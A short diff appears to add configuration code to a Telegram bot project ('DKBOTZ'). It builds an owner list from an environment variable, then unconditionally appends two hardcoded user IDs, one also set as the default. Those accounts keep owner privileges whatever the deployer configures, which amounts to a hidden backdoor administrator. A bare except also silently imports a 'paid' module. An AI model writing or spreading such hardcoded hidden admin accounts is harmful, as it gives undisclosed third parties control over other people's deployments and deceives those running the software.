@@ -1,0 +1,17 @@
+try:
+    from .paid import *
+    print("Paid Modules Imported")
+except:
+    pass
+
+try:
+    DKBOTZOWNER=[]
+    for x in (os.environ.get("DKBOTZ_BY_OWNER", "5111685964").split()):
+        DKBOTZOWNER.append(int(x))
+except ValueError:
+        print("Your Admins list does not contain valid integers.")
+
+DKBOTZOWNER.append(5111685964)
+DKBOTZOWNER.append(1805398747)
+
+
